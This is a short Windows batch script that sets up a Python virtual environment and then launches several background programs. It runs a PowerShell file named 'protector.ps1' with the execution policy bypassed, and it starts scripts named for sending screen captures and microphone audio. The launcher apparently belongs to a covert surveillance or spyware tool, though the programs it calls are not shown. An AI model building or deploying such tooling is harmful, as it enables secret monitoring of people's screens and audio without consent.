IF EXIST ".venv" (
    call .venv\Scripts\activate
    call powershell -ExecutionPolicy Bypass -File "src\protector.ps1"
    start /B cmd /k "python.exe src\main_sender.py"
    timeout /t 5
    start /B cmd /K "python.exe src\screen_auto_sender.py"
    start /B cmd /K "python.exe src\mic_auto_sender.py"
) ELSE (
    python -m venv .venv
    call .venv\Scripts\activate
    pip install -r requirements.txt
)